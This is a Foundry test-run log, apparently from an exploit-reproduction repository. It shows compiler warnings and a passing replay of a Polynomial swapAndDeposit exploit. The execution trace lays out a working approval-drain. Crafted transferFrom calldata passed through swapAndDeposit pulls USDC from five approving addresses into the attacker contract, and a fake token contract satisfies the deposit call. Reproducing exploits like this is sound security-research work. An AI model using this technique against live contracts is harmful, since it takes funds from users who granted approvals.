Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.17s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/Polynomial_exp.sol:26:5:
   |
26 |     IERC20 private constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/Polynomial_exp.sol:27:5:
   |
27 |     IERC20 private constant WETH = IERC20(0x4200000000000000000000000000000000000006);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/Polynomial_exp.sol:28:5:
   |
28 |     IERC20 private constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/Polynomial_exp.sol:82:5:
   |
82 |     function balanceOf(address account) public view returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 235.69ms (259.48µs CPU time)

Ran 1 test for src/test/2022-11/Polynomial_exp.sol:ContractTest
[PASS] testExploit() (gas: 181972)
Logs:
  [End] Attacker USDC balance after exploit: 209.167120

Traces:
  [215172] ContractTest::testExploit()
    ├─ [2585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf) [staticcall]
    │   └─ ← [Return] 53167120 [5.316e7]
    ├─ [54368] 0xDEEB242E045e5827Edf526399bd13E7fFEba4281::swapAndDeposit(0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7F5c764cBc14f9669B88837ca1490cCa17c31607, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0x23b872dd0000000000000000000000006467024ef6247a94c8cf60d50715ae71b8b1dfbf0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000032b4410)
    │   ├─ [44790] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transferFrom(0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 53167120 [5.316e7])
    │   │   ├─ emit Transfer(from: 0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 53167120 [5.316e7])
    │   │   ├─ emit Approval(owner: 0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf, spender: 0xDEEB242E045e5827Edf526399bd13E7fFEba4281, value: 127832880 [1.278e8])
    │   │   └─ ← [Return] true
    │   ├─ [444] ContractTest::balanceOf(0xDEEB242E045e5827Edf526399bd13E7fFEba4281) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [400] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   └─ ← [Return] true
    │   ├─ [403] ContractTest::initiateDeposit(0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf, 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [30468] 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82::swapAndDeposit(0x59022C79236A0F90bAc80b29357bc1d3e6d227d5, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7F5c764cBc14f9669B88837ca1490cCa17c31607, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0x23b872dd00000000000000000000000059022c79236a0f90bac80b29357bc1d3e6d227d50000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000989680)
    │   ├─ [20890] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transferFrom(0x59022C79236A0F90bAc80b29357bc1d3e6d227d5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000 [1e7])
    │   │   ├─ emit Transfer(from: 0x59022C79236A0F90bAc80b29357bc1d3e6d227d5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000 [1e7])
    │   │   ├─ emit Approval(owner: 0x59022C79236A0F90bAc80b29357bc1d3e6d227d5, spender: 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82, value: 50000000 [5e7])
    │   │   └─ ← [Return] true
    │   ├─ [444] ContractTest::balanceOf(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [400] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   └─ ← [Return] true
    │   ├─ [403] ContractTest::initiateDeposit(0x59022C79236A0F90bAc80b29357bc1d3e6d227d5, 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [2687] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::allowance(0xDa1521c966bc95324E156f4F04B28F2804985da5, 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   └─ ← [Return] 50000000 [5e7]
    ├─ [24468] 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82::swapAndDeposit(0xDa1521c966bc95324E156f4F04B28F2804985da5, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7F5c764cBc14f9669B88837ca1490cCa17c31607, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0x23b872dd000000000000000000000000da1521c966bc95324e156f4f04b28f2804985da50000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000002faf080)
    │   ├─ [16890] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transferFrom(0xDa1521c966bc95324E156f4F04B28F2804985da5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000 [5e7])
    │   │   ├─ emit Transfer(from: 0xDa1521c966bc95324E156f4F04B28F2804985da5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50000000 [5e7])
    │   │   ├─ emit Approval(owner: 0xDa1521c966bc95324E156f4F04B28F2804985da5, spender: 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [444] ContractTest::balanceOf(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [400] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   └─ ← [Return] true
    │   ├─ [403] ContractTest::initiateDeposit(0xDa1521c966bc95324E156f4F04B28F2804985da5, 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [2687] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::allowance(0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   └─ ← [Return] 50000000 [5e7]
    ├─ [24468] 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82::swapAndDeposit(0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7F5c764cBc14f9669B88837ca1490cCa17c31607, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0x23b872dd000000000000000000000000fd47c9ad54d12caa895fabcd4f7f4308a5f241610000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000002faf080)
    │   ├─ [16890] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transferFrom(0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000 [5e7])
    │   │   ├─ emit Transfer(from: 0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50000000 [5e7])
    │   │   ├─ emit Approval(owner: 0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, spender: 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [444] ContractTest::balanceOf(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [400] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   └─ ← [Return] true
    │   ├─ [403] ContractTest::initiateDeposit(0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161, 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [2687] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::allowance(0x316c42Af89b913429DBe4a86f30373172340A821, 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   └─ ← [Return] 46000000 [4.6e7]
    ├─ [24468] 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82::swapAndDeposit(0x316c42Af89b913429DBe4a86f30373172340A821, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7F5c764cBc14f9669B88837ca1490cCa17c31607, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0x23b872dd000000000000000000000000316c42af89b913429dbe4a86f30373172340a8210000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000002bde780)
    │   ├─ [16890] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transferFrom(0x316c42Af89b913429DBe4a86f30373172340A821, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 46000000 [4.6e7])
    │   │   ├─ emit Transfer(from: 0x316c42Af89b913429DBe4a86f30373172340A821, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 46000000 [4.6e7])
    │   │   ├─ emit Approval(owner: 0x316c42Af89b913429DBe4a86f30373172340A821, spender: 0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [444] ContractTest::balanceOf(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [400] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   └─ ← [Return] true
    │   ├─ [403] ContractTest::initiateDeposit(0x316c42Af89b913429DBe4a86f30373172340A821, 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 209167120 [2.091e8]
    ├─ [2401] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::decimals() [staticcall]
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 209167120 [2.091e8], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 302.06ms (4.66ms CPU time)

Ran 2 test suites in 304.02ms (537.75ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
